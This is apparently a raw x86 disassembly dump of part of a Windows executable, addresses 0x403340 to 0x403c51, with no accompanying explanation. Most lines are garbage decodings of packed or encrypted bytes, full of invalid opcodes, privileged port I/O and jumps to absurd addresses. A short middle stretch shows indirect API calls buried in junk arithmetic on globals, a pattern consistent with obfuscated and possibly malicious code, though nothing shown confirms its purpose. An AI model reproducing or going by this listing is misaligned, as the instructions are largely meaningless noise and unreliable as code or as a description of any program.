  403340:	ror    DWORD PTR [ecx+0x155bcf5b],0xf9
  403347:	pop    esp
  403348:	mov    bh,0xc0
  40334a:	cld    
  40334b:	sbb    BYTE PTR [esi],al
  40334d:	popa   
  40334e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40334f:	in     eax,0xa2
  403351:	add    DWORD PTR [eax],edi
  403353:	rcl    DWORD PTR [ebx-0x13],0xb6
  403357:	lea    ebp,[esi-0x6e8db950]
  40335d:	push   esi
  40335e:	lea    eax,[esi+0x2f]
  403361:	xor    edi,ebp
  403363:	jl     0x66b5e2e
  403369:	or     BYTE PTR [edx-0x71],bl
  40336c:	and    BYTE PTR ds:[ebx],0xb7
  403370:	dec    ebp
  403371:	inc    eax
  403372:	lods   eax,DWORD PTR ds:[esi]
  403373:	loope  0x403308
  403375:	push   cs
  403376:	mov    esi,DWORD PTR [eax-0x33]
  403379:	push   edi
  40337a:	cwde   
  40337b:	std    
  40337c:	fdivr  DWORD PTR [esi-0x4f]
  40337f:	sub    DWORD PTR [ecx-0x1cbd8a7e],esi
  403385:	jnp    0x403399
  403387:	lahf   
  403388:	pop    ss
  403389:	dec    esi
  40338a:	(bad)  
  40338b:	adc    eax,eax
  40338d:	ins    BYTE PTR es:[edi],dx
  40338e:	out    dx,al
  40338f:	sbb    DWORD PTR [edi+edx*4-0x22142a15],ebp
  403396:	vpmacsdql ymm2,ymm3,ymm2,YMMWORD PTR [edi]
  40339c:	lock test eax,0xa8e168be
  4033a2:	mov    ds:0xaf010b2b,al
  4033a7:	fsubr  QWORD PTR [ebp-0x51dd13d8]
  4033ad:	rcl    BYTE PTR [ecx+0x5c],0x67
  4033b1:	xchg   esi,eax
  4033b2:	rcl    edx,0x3b
  4033b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033b6:	push   ebp
  4033b7:	imul   esi,ecx,0x7bd3021d
  4033bd:	inc    eax
  4033be:	mov    DWORD PTR [ecx+0x17],edi
  4033c1:	xor    BYTE PTR [edi-0x7e3f1acb],dh
  4033c7:	icebp  
  4033c8:	repnz xchg esp,eax
  4033ca:	ret    0xeff7
  4033cd:	daa    
  4033ce:	mov    esi,0xd6498161
  4033d3:	nop
  4033d4:	or     eax,0xcad9e7bb
  4033d9:	aaa    
  4033da:	mov    cl,0x56
  4033dc:	jo     0x4033dc
  4033de:	out    0xa3,al
  4033e0:	out    dx,al
  4033e1:	and    BYTE PTR [ebx+0x49],0xc1
  4033e5:	fst    DWORD PTR [esi+0x5d]
  4033e8:	add    eax,0xd034faa6
  4033ed:	sub    BYTE PTR [edx-0x9cd0e28],ah
  4033f3:	inc    edx
  4033f4:	sub    ecx,ebp
  4033f6:	jge    0x40343e
  4033f8:	adc    BYTE PTR [edx+0x1ceadb61],dh
  4033fe:	pop    ss
  4033ff:	(bad)  
  403401:	fisttp QWORD PTR [ecx-0x3b1ddd4c]
  403407:	stc    
  403408:	or     ebp,DWORD PTR [edx+eiz*1-0x3445a652]
  40340f:	push   esp
  403410:	push   ebx
  403411:	mov    WORD PTR [esi+edi*4],ss
  403414:	dec    edx
  403415:	inc    ecx
  403416:	or     eax,DWORD PTR [ecx+edi*2]
  403419:	mov    bl,0xff
  40341b:	xchg   esp,eax
  40341c:	call   0xde05:0x7980d0cc
  403423:	sbb    DWORD PTR [ebx-0x2936d065],ecx
  403429:	xor    al,0xed
  40342b:	xchg   esi,eax
  40342c:	(bad)  
  40342d:	leave  
  40342e:	outs   dx,BYTE PTR ds:[esi]
  40342f:	stos   DWORD PTR es:[edi],eax
  403430:	jo     0x4033b3
  403432:	mov    fs,WORD PTR [edx+0x7a6f86bb]
  403438:	jmp    0x9f37f15e
  40343d:	call   0xb413af64
  403442:	jbe    0x403477
  403444:	fwait
  403445:	add    DWORD PTR [ebx],esp
  403447:	jns    0x4034a6
  403449:	addr16 int3 
  40344b:	ja     0x403467
  40344d:	sub    bh,BYTE PTR [eax+0x5a]
  403450:	repz push 0xb46b538a
  403456:	mov    fs,WORD PTR [edx+0x5ec3fc20]
  40345c:	pop    ebx
  40345d:	add    eax,DWORD PTR [esp+esi*2-0x36]
  403461:	dec    ebx
  403462:	push   edx
  403463:	push   edi
  403464:	and    ecx,DWORD PTR [edi+ecx*8]
  403467:	sub    BYTE PTR [esi+edx*4],ch
  40346a:	mov    eax,ds:0x54130411
  40346f:	or     ch,dl
  403471:	pushf  
  403472:	dec    ecx
  403473:	daa    
  403474:	les    eax,FWORD PTR [ecx-0x5d843b5e]
  40347a:	mov    dl,BYTE PTR [edx]
  40347c:	ret    
  40347d:	jns    0x403431
  40347f:	enter  0x1c13,0x4f
  403483:	in     al,0xdd
  403485:	jmp    0x7bb0:0x2cc5d606
  40348c:	cmp    bh,BYTE PTR [esi-0x7d]
  40348f:	popa   
  403490:	test   BYTE PTR [eax-0x5d],cl
  403493:	xchg   ch,ah
  403495:	pop    ebp
  403496:	fist   WORD PTR [ebp+0x30c9e6d]
  40349c:	fldenv [edi-0x46]
  40349f:	fidivr DWORD PTR [esi+0x7a5e6f16]
  4034a5:	pop    ebx
  4034a6:	dec    esi
  4034a7:	retf   
  4034a8:	hlt    
  4034a9:	addr16 pop ss
  4034ab:	xor    DWORD PTR [ebx+eiz*8-0x7c],edx
  4034af:	test   al,0x95
  4034b1:	dec    ecx
  4034b2:	xchg   edi,eax
  4034b3:	and    esp,DWORD PTR [ebp-0x4e6325cd]
  4034b9:	sbb    dl,BYTE PTR [ebx]
  4034bb:	inc    esi
  4034bc:	fistp  WORD PTR [ecx-0x2f06f70f]
  4034c2:	pop    ss
  4034c3:	or     DWORD PTR [edx],0x6a3ddd80
  4034c9:	lahf   
  4034ca:	int3   
  4034cb:	and    DWORD PTR [edi],ebp
  4034cd:	nop
  4034ce:	int    0x2b
  4034d0:	inc    esp
  4034d1:	adc    edx,DWORD PTR [edx]
  4034d3:	pop    esp
  4034d4:	imul   esi,edi,0x3b
  4034d7:	dec    esi
  4034d8:	sub    DWORD PTR [ecx+0x33],ebx
  4034db:	imul   ebp,DWORD PTR [ebx-0x7a],0xffffffb7
  4034df:	push   ebp
  4034e0:	into   
  4034e1:	pop    ebp
  4034e2:	dec    ecx
  4034e3:	jp     0x403465
  4034e5:	(bad)  
  4034e6:	fprem1 
  4034e8:	pushf  
  4034e9:	ss adc ebx,edi
  4034ec:	xchg   esp,eax
  4034ed:	mov    ecx,DWORD PTR [ebp-0x14]
  4034f0:	cmp    eax,DWORD PTR [ecx]
  4034f2:	mov    DWORD PTR ds:0x4281c3,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx+0x5a],ch
  403514:	sbb    esp,esi
  403516:	push   0xffffffc3
  403518:	in     eax,0x18
  40351a:	sbb    BYTE PTR [esi+0x76181812],bl
  403520:	fiadd  WORD PTR [ecx-0x196cb4d8]
  403526:	push   ebx
  403527:	out    0x74,al
  403529:	jg     0x40356a
  40352b:	push   ebx
  40352c:	lods   al,BYTE PTR ds:[esi]
  40352d:	out    0x81,al
  40352f:	psrld  mm0,QWORD PTR [ebp-0x46ff9cc7]
  403536:	and    al,0x6
  403538:	test   DWORD PTR [edi+ebx*4+0x73c36d40],ebx
  40353f:	inc    edi
  403540:	nop
  403541:	sub    eax,0x18f5509
  403546:	in     al,0xbd
  403548:	in     al,dx
  403549:	inc    esi
  40354a:	pop    esp
  40354b:	and    al,0x4a
  40354d:	xor    al,0xd0
  40354f:	(bad)  
  403550:	int    0x2
  403552:	out    0x0,al
  403554:	add    al,0xb3
  403556:	sbb    DWORD PTR [edx-0x1],edx
  403559:	xchg   ecx,eax
  40355a:	hlt    
  40355b:	cmp    al,0x27
  40355d:	lahf   
  40355e:	call   0xd5af0018
  403563:	lahf   
  403564:	shl    BYTE PTR [edx],0x95
  403567:	cdq    
  403568:	mov    DWORD PTR [esi-0x698a99e5],ecx
  40356e:	mov    al,0x21
  403570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403571:	sbb    DWORD PTR [edi+0x62],0xa21ee914
  403578:	xchg   esi,ebp
  40357a:	leave  
  40357b:	fs cmp al,0xa6
  40357e:	retf   
  40357f:	fsubr  QWORD PTR [ebp-0x56]
  403582:	inc    ebx
  403583:	cmovo  esp,DWORD PTR [edx]
  403586:	repz mov ch,0x91
  403589:	int    0x93
  40358b:	jmp    0x722cceeb
  403590:	xchg   ecx,eax
  403591:	xor    ebx,esi
  403593:	add    edi,DWORD PTR [ebx]
  403595:	rcl    DWORD PTR [edx+eax*4+0x729d9dc6],0x85
  40359d:	dec    esi
  40359e:	cmp    DWORD PTR [ecx+0x4b],esp
  4035a1:	xor    ch,dl
  4035a3:	fisub  DWORD PTR [ebx]
  4035a5:	pop    edi
  4035a6:	fwait
  4035a7:	jmp    0x403606
  4035a9:	sbb    al,0x8c
  4035ab:	jge    0x40353b
  4035ad:	mov    WORD PTR [esi-0xbbfdaf],?
  4035b3:	xchg   edi,eax
  4035b4:	sbb    ecx,ebp
  4035b6:	xchg   ebx,eax
  4035b7:	(bad)  
  4035b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035b9:	test   al,0xc2
  4035bb:	or     ah,BYTE PTR ds:0x711d8456
  4035c1:	xor    al,0x55
  4035c3:	ds ret 
  4035c5:	test   al,0x2d
  4035c7:	retf   
  4035c8:	inc    edx
  4035c9:	mov    ds:0x790879e4,al
  4035ce:	sbb    al,0x40
  4035d0:	xor    ebx,ebx
  4035d2:	or     edx,0x77ca3913
  4035d8:	jb     0x4035c5
  4035da:	inc    eax
  4035db:	(bad)  [ecx+0x4d]
  4035de:	repnz test eax,0x29e39fd4
  4035e4:	js     0x4035b5
  4035e6:	inc    ecx
  4035e7:	inc    ecx
  4035e8:	adc    eax,0xd031d1dc
  4035ed:	(bad)  
  4035ee:	jl     0x40358b
  4035f0:	jne    0x4035bb
  4035f2:	mov    DWORD PTR ds:0x3cdf32ab,ecx
  4035f8:	add    BYTE PTR ss:[eax+eax*4+0x402a555c],dh
  403600:	jne    0x40359d
  403602:	ret    0xd7f7
  403605:	and    DWORD PTR [eax+0x5f],0x366f7f2e
  40360c:	sar    BYTE PTR [edx+0x4a7b84b8],cl
  403612:	cmp    al,0x32
  403614:	mov    edi,0xcc0a3953
  403619:	adc    dh,dh
  40361b:	mov    ds:0x54cb8dc0,al
  403620:	das    
  403621:	mov    WORD PTR ds:0xe96c490c,?
  403627:	xchg   edi,eax
  403628:	push   ecx
  403629:	aas    
  40362a:	test   al,0x66
  40362c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40362d:	xchg   BYTE PTR [esi-0x61cfddf8],dh
  403633:	mov    edi,0x86d7f32b
  403638:	cmp    al,0xa6
  40363a:	jne    0x4036a5
  40363c:	sbb    BYTE PTR [esp+eax*8-0x54154f28],dl
  403643:	popf   
  403644:	jne    0x4035f3
  403646:	jle    0x40366d
  403648:	push   edi
  403649:	ret    0x9f4b
  40364c:	add    eax,0xe53244b5
  403651:	inc    BYTE PTR [esi-0x580a2790]
  403657:	fld    QWORD PTR [ebp+eiz*8-0x63]
  40365b:	(bad)  
  40365c:	sar    BYTE PTR [ecx],1
  40365e:	cmp    ebx,DWORD PTR cs:[ecx]
  403661:	std    
  403662:	xor    bl,BYTE PTR [ebx]
  403664:	xchg   ebp,eax
  403665:	es dec ebp
  403667:	jl     0x403688
  403669:	mov    edi,0xce08020a
  40366e:	scas   al,BYTE PTR es:[edi]
  40366f:	jmp    0x7f18:0x554b70c2
  403676:	add    eax,0x24bb3128
  40367b:	scas   al,BYTE PTR es:[edi]
  40367c:	mov    cl,0x97
  40367e:	or     eax,0xd7adaf47
  403683:	add    edx,esi
  403685:	test   al,0x6a
  403687:	test   DWORD PTR [ebx-0x64c5510a],0x93816712
  403691:	xor    bl,BYTE PTR [ebp+0x12f4a6df]
  403697:	xor    BYTE PTR [ecx-0x755cf5f2],bl
  40369d:	rcr    ch,cl
  40369f:	fist   DWORD PTR [esi]
  4036a1:	or     DWORD PTR [ecx-0x75],edx
  4036a4:	or     ch,cl
  4036a6:	mov    al,ds:0x7985dff6
  4036ab:	jl     0x4036a4
  4036ad:	(bad)  
  4036ae:	mov    dh,0xcd
  4036b0:	sub    eax,0x47853f7c
  4036b5:	xor    eax,0xa302d26f
  4036ba:	inc    DWORD PTR [ecx-0x41e5f75e]
  4036c0:	stos   BYTE PTR es:[edi],al
  4036c1:	jle    0x40364d
  4036c3:	sti    
  4036c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036c5:	retf   0xa38f
  4036c8:	mov    edi,0xccddb278
  4036cd:	adc    BYTE PTR [edx+0x24a7e0e9],0xd0
  4036d4:	fsub   QWORD PTR [edi-0x11]
  4036d7:	sbb    ecx,DWORD PTR [ecx]
  4036d9:	or     al,0x19
  4036db:	cmp    ecx,DWORD PTR [eiz*4-0x47e0ec63]
  4036e2:	stc    
  4036e3:	bound  ebx,QWORD PTR [edx]
  4036e5:	rol    DWORD PTR [esi+0x44b6244f],0xf
  4036ec:	add    ebp,edi
  4036ee:	or     DWORD PTR ds:0xdc5cac3b,ebp
  4036f4:	into   
  4036f5:	(bad)
  4036f8:	mov    eax,ds:0xa1fd3b44
  4036fd:	out    dx,eax
  4036fe:	lods   al,BYTE PTR ds:[esi]
  4036ff:	xchg   dh,bh
  403701:	jae    0x4036d4
  403703:	xchg   BYTE PTR [ecx+0x601f3eed],dh
  403709:	or     DWORD PTR [esi+0x70],edi
  40370c:	push   ebp
  40370d:	jmp    0x6a651cf0
  403712:	inc    eax
  403713:	and    ecx,DWORD PTR [esi-0x503a415]
  403719:	aam    0x49
  40371b:	mov    dl,0xf5
  40371d:	cmp    eax,0xfff2d6b2
  403722:	sub    dl,BYTE PTR ds:0x7b1475e3
  403728:	outs   dx,BYTE PTR ds:[esi]
  403729:	adc    cl,al
  40372b:	jge    0x4037a9
  40372d:	out    dx,eax
  40372e:	retf   
  40372f:	dec    edx
  403730:	adc    ecx,edi
  403732:	jb     0x4036e5
  403734:	or     al,0x2b
  403736:	and    al,0xde
  403738:	jg     0x40374c
  40373a:	imul   cl
  40373c:	xchg   ebp,eax
  40373d:	jno    0x4037bb
  40373f:	xor    BYTE PTR [edi-0x7d],al
  403742:	std    
  403743:	ror    BYTE PTR ds:0x2dc50ac8,cl
  403749:	fs push edx
  40374b:	and    DWORD PTR [edx],edi
  40374d:	add    bh,dl
  40374f:	or     al,ch
  403751:	lock lods eax,DWORD PTR ds:[esi]
  403753:	out    0xbf,eax
  403755:	jno    0x4037d4
  403757:	xor    edx,DWORD PTR [ebp*2-0x8522ed2]
  40375e:	pop    esp
  40375f:	mov    edx,0x4327d896
  403764:	xor    al,0x3
  403766:	imul   ebx,DWORD PTR [edx+0x55],0xffffff8e
  40376a:	clc    
  40376b:	inc    ebx
  40376c:	(bad)
  403771:	mov    WORD PTR [ecx+0x35],cs
  403774:	jo     0x40370a
  403776:	and    DWORD PTR [esi+0x9],edx
  403779:	icebp  
  40377a:	(bad)  
  40377b:	mov    eax,0xed762def
  403780:	dec    ebp
  403781:	mov    al,ds:0x591e0d3d
  403786:	xor    al,0xef
  403788:	adc    eax,0x88469e71
  40378d:	pop    esp
  40378e:	push   eax
  40378f:	les    eax,FWORD PTR [edx+0x78]
  403792:	lea    eax,[edx+0x34d88808]
  403798:	sar    DWORD PTR [edx],1
  40379a:	xchg   DWORD PTR [ebx],ecx
  40379c:	ds lock ins BYTE PTR es:[edi],dx
  40379f:	imul   DWORD PTR [ecx]
  4037a1:	mov    dh,0x59
  4037a3:	and    DWORD PTR ds:0x229c8011,ebx
  4037a9:	mov    ecx,0xb5c2ef3
  4037ae:	(bad)  
  4037b0:	jmp    0x6024:0xde5823ff
  4037b7:	ret    0x98de
  4037ba:	icebp  
  4037bb:	les    eax,FWORD PTR [ecx+0x8]
  4037be:	push   esi
  4037bf:	sub    al,al
  4037c1:	loop   0x40379d
  4037c3:	and    dh,BYTE PTR [edx]
  4037c5:	shl    DWORD PTR [eax],1
  4037c7:	and    ebp,DWORD PTR [ebx+edi*8+0x9]
  4037cb:	inc    ebx
  4037cc:	lock nop
  4037ce:	cmc    
  4037cf:	mov    ah,0x90
  4037d1:	inc    ecx
  4037d2:	mov    dl,0x2c
  4037d4:	xchg   esi,eax
  4037d5:	test   al,0x14
  4037d7:	add    bl,ah
  4037d9:	sbb    esi,edx
  4037db:	fwait
  4037dc:	cmp    BYTE PTR [edx],dl
  4037de:	cmc    
  4037df:	pusha  
  4037e0:	or     BYTE PTR [ecx+0x5b5e3c0],cl
  4037e6:	cdq    
  4037e7:	mov    ?,WORD PTR [ebx+ebx*4]
  4037ea:	jns    0x4037cf
  4037ec:	sar    DWORD PTR ds:0x7ee4dfa,0x58
  4037f3:	shl    BYTE PTR [edi+esi*4],1
  4037f6:	jbe    0x403875
  4037f8:	add    DWORD PTR [ebx-0x3fe13ea5],ecx
  4037fe:	add    ebp,DWORD PTR [edx-0x7a]
  403801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403802:	ret    0xe1cd
  403805:	cmp    al,0xe6
  403807:	stos   DWORD PTR es:[edi],eax
  403808:	repz test eax,0xedd78389
  40380e:	scas   al,BYTE PTR es:[edi]
  40380f:	aad    0xaa
  403811:	add    BYTE PTR [eax+ebx*1-0x6c],bl
  403815:	in     eax,0xbf
  403817:	ins    BYTE PTR es:[edi],dx
  403818:	xchg   edx,eax
  403819:	mov    DWORD PTR ds:0x21a3f112,ecx
  40381f:	cmp    eax,0xb4e603d5
  403824:	dec    ebx
  403825:	mov    al,0x8a
  403827:	mov    ds:0xe22eb070,al
  40382c:	rcr    BYTE PTR [eax+0x3e],0x98
  403830:	adc    BYTE PTR [eax-0xbb90ec9],0x96
  403837:	dec    esp
  403838:	mov    esp,0x315d57af
  40383d:	je     0x4038b4
  40383f:	jg     0x4038b4
  403841:	data16 sub al,0x47
  403844:	gs icebp 
  403846:	aaa    
  403847:	and    eax,esi
  403849:	mov    ecx,0x87fe66a2
  40384e:	add    dl,BYTE PTR [ebx-0x7b]
  403851:	xor    DWORD PTR [eax],0xffffffc7
  403854:	add    DWORD PTR [ebx-0x40ced7b6],ecx
  40385a:	pop    edx
  40385b:	mov    edx,0xc1660019
  403860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403861:	push   ebp
  403862:	and    dh,BYTE PTR [ebx-0x2f402542]
  403868:	in     al,0x20
  40386a:	push   edx
  40386b:	fbstp  TBYTE PTR [esi+0x3f70de35]
  403871:	inc    eax
  403872:	shr    BYTE PTR [eax-0x43],cl
  403875:	add    al,0xbd
  403877:	ror    esi,cl
  403879:	xchg   ebx,eax
  40387a:	inc    esi
  40387b:	sub    dh,BYTE PTR [eax-0x7b]
  40387e:	aas    
  40387f:	mov    esi,0x8538b8b7
  403884:	sub    dl,BYTE PTR [eax+0x5f]
  403887:	push   ecx
  403888:	(bad)  
  403889:	imul   ecx,DWORD PTR [edi+0x59],0x14fd585b
  403890:	and    eax,0x86576b06
  403895:	shl    ah,cl
  403897:	adc    al,0xf4
  403899:	arpl   WORD PTR [esi],sp
  40389b:	pop    es
  40389c:	fld    TBYTE PTR [edx-0x4e7ee629]
  4038a2:	push   eax
  4038a3:	mov    esp,0xe6517cb4
  4038a8:	xchg   esp,eax
  4038a9:	jne    0x403847
  4038ab:	(bad)  
  4038ac:	xchg   esp,eax
  4038ad:	sbb    al,ch
  4038af:	push   ebx
  4038b0:	add    BYTE PTR [edi-0x35],bh
  4038b3:	pop    ds
  4038b4:	scas   al,BYTE PTR es:[edi]
  4038b5:	xor    DWORD PTR [ecx-0x6fe1321e],0xffffff8e
  4038bc:	dec    esp
  4038bd:	les    eax,FWORD PTR es:[eax-0x26ba00cd]
  4038c4:	daa    
  4038c5:	pushf  
  4038c6:	pop    ebp
  4038c7:	imul   ebp,ecx,0x16
  4038ca:	ret    0x63ec
  4038cd:	mov    bl,0xc7
  4038cf:	mov    esp,0x21dc68dd
  4038d4:	mov    dh,0xe7
  4038d6:	jmp    0x4da11de9
  4038db:	mov    WORD PTR ds:0x8b9c5d98,fs
  4038e1:	inc    ebp
  4038e2:	hlt    
  4038e3:	cmp    DWORD PTR ds:0x4282c3,0x0
  4038ea:	not    DWORD PTR ds:0x4281bb
  4038f0:	mov    ecx,DWORD PTR ds:0x4282e7
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x4282c3,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428f38
  403913:	xor    edx,DWORD PTR ds:0x4282af
  403919:	neg    DWORD PTR ds:0x4282c3
  40391f:	xor    DWORD PTR ds:0x4281b7,0x12a5
  403929:	and    DWORD PTR ds:0x428407,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x4282eb
  403939:	or     ecx,DWORD PTR ds:0x42829f
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x4281c3,0x0
  403949:	mov    DWORD PTR ds:0x428407,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x4281c3,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428e0c
  40397f:	adc    DWORD PTR ds:0x4282f7,0x4281df
  403989:	sbb    DWORD PTR ds:0x4282e3,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x4283e3
  403999:	or     DWORD PTR ds:0x4282bf,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x4282e7
  4039a7:	adc    edx,DWORD PTR ds:0x4282cb
  4039ad:	mov    DWORD PTR ds:0x4282e7,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x42829f,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x428307,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x4282fb,0x428407
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x4281db
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x4281b7,0x42837f
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x4281c3,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x4281bb,0x428353
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x4282cf,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x4282e7,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x4281b7,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x4282e3,0x0
  403a3e:	mov    DWORD PTR ds:0x42836f,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x428407
  403a57:	cmp    DWORD PTR ds:0x4282e3,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428de8
  403a6f:	mov    edx,DWORD PTR ds:0x42839f
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x428433
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x4281e3,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x4281d7,0x2089
  403aa2:	or     DWORD PTR ds:0x4281bb,0x113b
  403aac:	mov    eax,ds:0x422430
  403ab1:	cmp    DWORD PTR ds:0x4281e3,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x4282af
  403ac3:	mov    DWORD PTR ds:0x428293,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x428383,0x6b1a
  403adc:	mov    DWORD PTR ds:0x4281e3,0x1226
  403ae6:	cmp    DWORD PTR ds:0x4281e3,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x428183
  403af8:	call   DWORD PTR ds:0x428e10
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x4282ab,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x4282ef,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x4283db,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x4281cb,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0xaa277498
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi-0x3fe7e7ee],bl
  403b4b:	outs   dx,BYTE PTR ds:[esi]
  403b4c:	push   esi
  403b4d:	daa    
  403b4e:	call   0x505e7875
  403b53:	adc    cl,bl
  403b55:	sti    
  403b56:	aaa    
  403b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b58:	jecxz  0x403b3a
  403b5a:	mov    ebp,0x57323898
  403b5f:	xchg   ebp,eax
  403b60:	stos   BYTE PTR es:[edi],al
  403b61:	les    esp,FWORD PTR [ebp-0x1a]
  403b64:	fs pop esi
  403b66:	cmp    eax,0x28d14919
  403b6b:	or     al,0x87
  403b6d:	stc    
  403b6e:	out    dx,eax
  403b6f:	cli    
  403b70:	ds jo  0x403be7
  403b73:	dec    ebx
  403b74:	cdq    
  403b75:	mov    ah,0xc1
  403b77:	xor    al,0xf7
  403b79:	repz (bad) 
  403b7b:	sbb    al,BYTE PTR [ecx]
  403b7d:	jbe    0x403b64
  403b7f:	sub    ebp,DWORD PTR [edi]
  403b81:	pop    eax
  403b82:	loop   0x403b8d
  403b84:	xlat   BYTE PTR ds:[ebx]
  403b85:	(bad)  
  403b86:	jp     0x403ba1
  403b88:	ja     0x403beb
  403b8a:	xor    BYTE PTR [esi],dl
  403b8c:	dec    ebp
  403b8d:	pop    ss
  403b8e:	fist   WORD PTR [esi]
  403b90:	fild   WORD PTR [esi-0x3c0395c1]
  403b96:	les    esi,FWORD PTR [edi]
  403b98:	outs   dx,BYTE PTR ds:[esi]
  403b99:	gs pushf 
  403b9b:	and    eax,0xf1e1da22
  403ba0:	sub    eax,0x2b02392f
  403ba5:	pop    ebx
  403ba6:	(bad)  
  403ba7:	fmul   st,st(7)
  403ba9:	lea    edx,[eax+0x78]
  403bac:	rol    BYTE PTR [ebx+eiz*4+0x1465d52b],1
  403bb3:	and    edx,DWORD PTR [esi+ebx*1-0x11]
  403bb7:	lds    esi,FWORD PTR [ebp+0x6bf7a56]
  403bbd:	ret    0x5949
  403bc0:	and    bh,BYTE PTR [esi]
  403bc2:	in     eax,0xd0
  403bc4:	add    esp,esi
  403bc6:	adc    al,0xd0
  403bc8:	loope  0x403c3d
  403bca:	xchg   ebp,esp
  403bcc:	sbb    BYTE PTR [eax-0x4b],0x64
  403bd0:	sbb    esp,DWORD PTR ds:[ecx+ebp*2]
  403bd4:	pop    edx
  403bd5:	(bad)  
  403bd6:	in     al,dx
  403bd7:	lea    ebx,[edi-0x1f]
  403bda:	push   es
  403bdb:	neg    DWORD PTR [ecx+0x37f553d3]
  403be1:	rcl    BYTE PTR [ebx-0x7e5f381a],0x5e
  403be8:	cmp    BYTE PTR [ecx+eiz*4-0x2e9a150d],dh
  403bef:	sbb    eax,0x175b1782
  403bf4:	mov    ecx,0xa70e4663
  403bf9:	push   edx
  403bfa:	xchg   DWORD PTR [esi+0x695253df],edi
  403c00:	cmp    al,0xcf
  403c02:	repnz and DWORD PTR [ecx+0x65],esp
  403c06:	pop    ecx
  403c07:	xchg   ebp,eax
  403c08:	xor    cl,BYTE PTR [esp+ecx*2-0x6a77e61d]
  403c0f:	retf   
  403c10:	scas   al,BYTE PTR es:[edi]
  403c11:	dec    ebx
  403c12:	cdq    
  403c13:	add    ecx,ebx
  403c15:	push   ds
  403c16:	push   esp
  403c17:	bound  ebp,QWORD PTR [edi]
  403c19:	shl    bh,1
  403c1b:	jmp    0x403c83
  403c1d:	dec    esi
  403c1e:	push   0xf8b2fb3a
  403c23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c24:	jns    0x403c44
  403c26:	mov    eax,ebx
  403c28:	mov    edx,0x4cb63deb
  403c2d:	cmp    dl,BYTE PTR [ebx-0x68b4e0cb]
  403c33:	dec    esi
  403c34:	push   ebx
  403c35:	popf   
  403c36:	mov    ds:0xbbd17794,eax
  403c3b:	clc    
  403c3c:	mov    edi,0xbe06311e
  403c41:	cli    
  403c42:	sub    ebx,ebp
  403c44:	fadd   QWORD PTR [eax-0x3e]
  403c47:	addr16 leave 
  403c49:	push   ebx
  403c4a:	and    DWORD PTR [ecx-0x5b35755c],0x36
  403c51:	int3   
